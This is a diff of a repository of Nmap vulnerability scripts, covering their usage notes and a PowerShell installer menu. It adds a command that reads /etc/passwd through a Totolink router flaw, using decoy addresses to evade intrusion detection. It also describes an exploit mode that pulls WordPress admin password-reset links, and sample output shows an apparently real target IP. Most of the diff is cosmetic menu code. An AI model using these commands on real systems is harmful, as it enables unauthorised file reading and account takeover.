@@ -148,13 +148,17 @@ setUploadSetting of the file /cgi-bin/cstecgi.cgi, such manipulation of the @arg
 leads to file inclusion, remote code execution, buffer overflow or modification of configurations
 
 how detection works
-CVE-2026-7633-enum.nse searchs for /cgi-bin/cstecgi.cgi [uri] on target host has first vulnerability check
-has second test it searchs for 'setUploadSetting' vulnerable function (inside /cgi-bin/cstecgi.cgi) then it
-searchs for string.match(response.body,"Totolink N300RH 6.1c.13(53|90)") to confirm vulnerable versions
+CVE-2026-7633-enum.nse searchs for /cgi-bin/cstecgi.cgi [uri] on target host has first vulnerability
+test, has second test it searchs for string.match(response.body,"Totolink N300RH 6.1c.13(53|90)") to
+confirm vulnerable versions, has final test sends one http.post() request to test for @args.filename
+access [read access] confirming that the vulnerability is 100% present and public exploitable
 
-@Output
-|CVE-2026-7633-enum:
-|  Totolink N300RH V6.1c
+test if we have read access to /etc/passwd
+nmap -sS -T2 <target> -p 80 --open --script CVE-2026-7633-enum --script-args filename="/etc/passwd"
+IDS evasion: --script-args filename="/etc/passwd" -D 4.207.247.138,52.123.131.14 --data-length "28"
+
+Output
+|Totolink N300RH V6.1c
 |  STATE: VULNERABLE
 |    ID: CVE:CVE-2026-7633
 |    Risk factor: 6.4 (MEDIUM) (AV:N/AC:L/Au:N/C:N/I:P/A:P)
@@ -164,11 +168,11 @@ searchs for string.match(response.body,"Totolink N300RH 6.1c.13(53|90)") to conf
 |
 |  Disclosure date: 2026-05-01
 |  Exploit results:
-|    Uri: http://216.99.115.136:8080/cgi-bin/cstecgi.cgi
-|    attack vector: setUploadSetting [vulnerable]
-|    firmware version: N300RH 6.1c.1390 [vulnerable]
-|    affected versions: V6.1c.1353, V6.1c.1390
-|      module Author: r00t-3xp10it
+|    Uri: http://216.99.115.136:8080/cgi-bin/cstecgi.cgi [found]
+|    _firmware version: N300RH 6.1c.1390 [vulnerable version]
+|      filename access: /etc/passwd [read access]
+|      filename contents: root:x:0:0:root:/root:/bin/bash
+|        module Author: r00t-3xp10it
 |
 |  Referencies:
 |    https://www.tenable.com/cve/CVE-2026-7633
@@ -311,13 +315,13 @@ on the __construct function in all versions up to and including, 3.6.0 This make
 for unauthenticated attackers to read arbitrary logged emails sent through the Post SMTP plugin,
 including password reset emails containing password reset links which can lead to account takeover
 
-Remarks: --script-args exploit="true" argument attempts to exploit the password reset vulnerability
-by sending a http.post() request with a link to reset password. revealing that the system is 100%
-vulnerable to CVE-2025-11833 vulnerability if successefuly executed (response.status == [200] OK)
+Remark: --script-args exploit="true" argument sends a http.post() request with a link to reset
+the wordpress admin password, then checks if target host responds with the recuperation link to
+confirm that system its 100% vulnerable to CVE-2025-11833 wordpress reset link vulnerability.
 
 Some web developers have moved /wp-login.php landing webpage further ahead in the website directory
-structure like: 'http://host:port/website/plugins/wp-login.php' in that case we can invoke CVE-2025-1183.nse:
---script-args uri="/website/plugins/wp-login.php" (described steps required if: --script-args exploit="true")
+structure like: 'http://host:port/website/plugins/wp-login.php' in that case invoke CVE-2025-1183.nse:
+--script-args uri="/website/plugins/wp-login.php" (required if invoked: --script-args exploit="true")
 
 Output
 PORT   STATE SERVICE   VERSION
@@ -334,7 +338,7 @@ CVE-2025-11833-enum:
 |  Exploit results:
 |   smtp detection: post smtp 3.6.0 [vulnerable version]
 |   _post request: /wp-login.php?action=lostpassword&page=postman_email_log&view=log&log_id=1&print=1
-|   _response: POST request successfully accepted [200] OK
+|   _response: password reset link found in response [vulnerable]
 |     module author: r00t-3xp10it
 |
 | Referencies:
@@ -459,10 +463,10 @@ function Invoke-Menu()
                      write-host "`n[" -NoNewline
                      write-host "*" -ForegroundColor Green -NoNewline
                      write-host "] " -NoNewline
-                     write-host "$NmapInstallPath\scripts\vulners.nse " -ForegroundColor Green
+                     write-host "$NmapInstallPath\scripts\vulners.nse " -ForegroundColor Green -NoNewline
                      write-host "[" -NoNewline
                      write-host "updated" -ForegroundColor Green -NoNewline
-                     write-host "]" -ForegroundColor Green
+                     write-host "]"
                   }
                   Else
                   {
@@ -472,7 +476,7 @@ function Invoke-Menu()
                      write-host "$NmapInstallPath\scripts\vulners.nse " -ForegroundColor Green -NoNewline
                      write-host "[" -NoNewline
                      write-host "installed" -ForegroundColor Green -NoNewline
-                     write-host "]" -ForegroundColor Green
+                     write-host "]"
                   }
                   cmd /c 'pause'
                }
@@ -482,7 +486,7 @@ function Invoke-Menu()
                   cmd /c 'pause'
                }
             }
-            ElseIf($InstalSecret -imatch '^(delete)$')
+            ElseIf($InstallVulners -imatch '^(delete)$')
             {
                If(-not(Test-path -path "$NmapInstallPath\scripts\vulners.nse" -PathType Leaf))
                {
@@ -552,10 +556,10 @@ function Invoke-Menu()
                      write-host "`n[" -NoNewline
                      write-host "*" -ForegroundColor Green -NoNewline
                      write-host "] " -NoNewline
-                     write-host "$NmapInstallPath\scripts\AXISwebcam-enum.nse " -ForegroundColor Green
+                     write-host "$NmapInstallPath\scripts\AXISwebcam-enum.nse " -ForegroundColor Green -NoNewline
                      write-host "[" -NoNewline
                      write-host "updated" -ForegroundColor Green -NoNewline
-                     write-host "]" -ForegroundColor Green
+                     write-host "]"
                   }
                   Else
                   {
@@ -565,7 +569,7 @@ function Invoke-Menu()
                      write-host "$NmapInstallPath\scripts\AXISwebcam-enum.nse " -ForegroundColor Green -NoNewline
                      write-host "[" -NoNewline
                      write-host "installed" -ForegroundColor Green -NoNewline
-                     write-host "]" -ForegroundColor Green
+                     write-host "]"
                   }
                   cmd /c 'pause'
                }
@@ -645,10 +649,10 @@ function Invoke-Menu()
                      write-host "`n[" -NoNewline
                      write-host "*" -ForegroundColor Green -NoNewline
                      write-host "] " -NoNewline
-                     write-host "$NmapInstallPath\scripts\CVE-2026-7633-enum.nse " -ForegroundColor Green
+                     write-host "$NmapInstallPath\scripts\CVE-2026-7633-enum.nse " -ForegroundColor Green -NoNewline
                      write-host "[" -NoNewline
                      write-host "updated" -ForegroundColor Green -NoNewline
-                     write-host "]" -ForegroundColor Green
+                     write-host "]"
                   }
                   Else
                   {
@@ -658,7 +662,7 @@ function Invoke-Menu()
                      write-host "$NmapInstallPath\scripts\CVE-2026-7633-enum.nse " -ForegroundColor Green -NoNewline
                      write-host "[" -NoNewline
                      write-host "installed" -ForegroundColor Green -NoNewline
-                     write-host "]" -ForegroundColor Green
+                     write-host "]"
                   }
                   cmd /c 'pause'
                }
@@ -668,7 +672,7 @@ function Invoke-Menu()
                   cmd /c 'pause'
                }
             }
-            ElseIf($InstalSecret -imatch '^(delete)$')
+            ElseIf($InstallTotoLink -imatch '^(delete)$')
             {
                If(-not(Test-path -path "$NmapInstallPath\scripts\CVE-2026-7633-enum.nse" -PathType Leaf))
                {
@@ -738,10 +742,10 @@ function Invoke-Menu()
                      write-host "`n[" -NoNewline
                      write-host "*" -ForegroundColor Green -NoNewline
                      write-host "] " -NoNewline
-                     write-host "$NmapInstallPath\scripts\dlink-cve-2019-13101.nse " -ForegroundColor Green
+                     write-host "$NmapInstallPath\scripts\dlink-cve-2019-13101.nse " -ForegroundColor Green -NoNewline
                      write-host "[" -NoNewline
                      write-host "updated" -ForegroundColor Green -NoNewline
-                     write-host "]" -ForegroundColor Green
+                     write-host "]"
                   }
                   Else
                   {
@@ -751,7 +755,7 @@ function Invoke-Menu()
                      write-host "$NmapInstallPath\scripts\dlink-cve-2019-13101.nse " -ForegroundColor Green -NoNewline
                      write-host "[" -NoNewline
                      write-host "installed" -ForegroundColor Green -NoNewline
-                     write-host "]" -ForegroundColor Green
+                     write-host "]"
                   }
                   cmd /c 'pause'
                }
@@ -761,7 +765,7 @@ function Invoke-Menu()
                   cmd /c 'pause'
                }
             }
-            ElseIf($InstalSecret -imatch '^(delete)$')
+            ElseIf($InstallDlink -imatch '^(delete)$')
             {
                If(-not(Test-path -path "$NmapInstallPath\scripts\dlink-cve-2019-13101.nse" -PathType Leaf))
                {
@@ -831,10 +835,10 @@ function Invoke-Menu()
                      write-host "`n[" -NoNewline
                      write-host "*" -ForegroundColor Green -NoNewline
                      write-host "] " -NoNewline
-                     write-host "$NmapInstallPath\scripts\smtp-vuln-cve2020-28017-through-28026-21nails.nse " -ForegroundColor Green
+                     write-host "$NmapInstallPath\scripts\smtp-vuln-cve2020-28017-through-28026-21nails.nse " -ForegroundColor Green -NoNewline
                      write-host "[" -NoNewline
                      write-host "updated" -ForegroundColor Green -NoNewline
-                     write-host "]" -ForegroundColor Green
+                     write-host "]"
                   }
                   Else
                   {
@@ -844,7 +848,7 @@ function Invoke-Menu()
                      write-host "$NmapInstallPath\scripts\smtp-vuln-cve2020-28017-through-28026-21nails.nse " -ForegroundColor Green -NoNewline
                      write-host "[" -NoNewline
                      write-host "installed" -ForegroundColor Green -NoNewline
-                     write-host "]" -ForegroundColor Green
+                     write-host "]"
                   }
                   cmd /c 'pause'
                }
@@ -854,7 +858,7 @@ function Invoke-Menu()
                   cmd /c 'pause'
                }
             }
-            ElseIf($InstalSecret -imatch '^(delete)$')
+            ElseIf($InstallSMTP -imatch '^(delete)$')
             {
                If(-not(Test-path -path "$NmapInstallPath\scripts\smtp-vuln-cve2020-28017-through-28026-21nails.nse" -PathType Leaf))
                {
@@ -927,7 +931,7 @@ function Invoke-Menu()
                      write-host "$NmapInstallPath\scripts\abb-cve-2019-7226.nse " -ForegroundColor Green
                      write-host "[" -NoNewline
                      write-host "updated" -ForegroundColor Green -NoNewline
-                     write-host "]" -ForegroundColor Green
+                     write-host "]"
                   }
                   Else
                   {
@@ -937,7 +941,7 @@ function Invoke-Menu()
                      write-host "$NmapInstallPath\scripts\abb-cve-2019-7226.nse " -ForegroundColor Green -NoNewline
                      write-host "[" -NoNewline
                      write-host "installed" -ForegroundColor Green -NoNewline
-                     write-host "]" -ForegroundColor Green
+                     write-host "]"
                   }
                   cmd /c 'pause'
                }
@@ -947,7 +951,7 @@ function Invoke-Menu()
                   cmd /c 'pause'
                }
             }
-            ElseIf($InstalSecret -imatch '^(delete)$')
+            ElseIf($InstallABB -imatch '^(delete)$')
             {
                If(-not(Test-path -path "$NmapInstallPath\scripts\abb-cve-2019-7226.nse" -PathType Leaf))
                {
@@ -1020,7 +1024,7 @@ function Invoke-Menu()
                      write-host "$NmapInstallPath\scripts\http-livestreet-brute.nse " -ForegroundColor Green
                      write-host "[" -NoNewline
                      write-host "updated" -ForegroundColor Green -NoNewline
-                     write-host "]" -ForegroundColor Green
+                     write-host "]"
                   }
                   Else
                   {
@@ -1030,7 +1034,7 @@ function Invoke-Menu()
                      write-host "$NmapInstallPath\scripts\http-livestreet-brute.nse " -ForegroundColor Green -NoNewline
                      write-host "[" -NoNewline
                      write-host "installed" -ForegroundColor Green -NoNewline
-                     write-host "]" -ForegroundColor Green
+                     write-host "]"
                   }
                   cmd /c 'pause'
                }
@@ -1040,7 +1044,7 @@ function Invoke-Menu()
                   cmd /c 'pause'
                }
             }
-            ElseIf($InstalSecret -imatch '^(delete)$')
+            ElseIf($InstallLIve -imatch '^(delete)$')
             {
                If(-not(Test-path -path "$NmapInstallPath\scripts\http-livestreet-brute.nse" -PathType Leaf))
                {
@@ -1110,10 +1114,10 @@ function Invoke-Menu()
                      write-host "`n[" -NoNewline
                      write-host "*" -ForegroundColor Green -NoNewline
                      write-host "] " -NoNewline
-                     write-host "$NmapInstallPath\scripts\CVE-2025-11833.nse " -ForegroundColor Green
+                     write-host "$NmapInstallPath\scripts\CVE-2025-11833.nse " -ForegroundColor Green -NoNewline
                      write-host "[" -NoNewline
                      write-host "updated" -ForegroundColor Green -NoNewline
-                     write-host "]" -ForegroundColor Green
+                     write-host "]"
                   }
                   Else
                   {
@@ -1123,7 +1127,7 @@ function Invoke-Menu()
                      write-host "$NmapInstallPath\scripts\CVE-2025-11833.nse " -ForegroundColor Green -NoNewline
                      write-host "[" -NoNewline
                      write-host "installed" -ForegroundColor Green -NoNewline
-                     write-host "]" -ForegroundColor Green
+                     write-host "]"
                   }
                   cmd /c 'pause'
                }
@@ -1197,10 +1201,10 @@ function Invoke-Menu()
                      write-host "`n[" -NoNewline
                      write-host "*" -ForegroundColor Green -NoNewline
                      write-host "] " -NoNewline
-                     write-host "$NmapInstallPath\scripts\secret-finder.nse " -ForegroundColor Green
+                     write-host "$NmapInstallPath\scripts\secret-finder.nse " -ForegroundColor Green -NoNewline
                      write-host "[" -NoNewline
                      write-host "updated" -ForegroundColor Green -NoNewline
-                     write-host "]" -ForegroundColor Green
+                     write-host "]"
                   }
                   Else
                   {
@@ -1210,7 +1214,7 @@ function Invoke-Menu()
                      write-host "$NmapInstallPath\scripts\secret-finder.nse " -ForegroundColor Green -NoNewline
                      write-host "[" -NoNewline
                      write-host "installed" -ForegroundColor Green -NoNewline
-                     write-host "]" -ForegroundColor Green
+                     write-host "]"
                   }
                   cmd /c 'pause'
                }
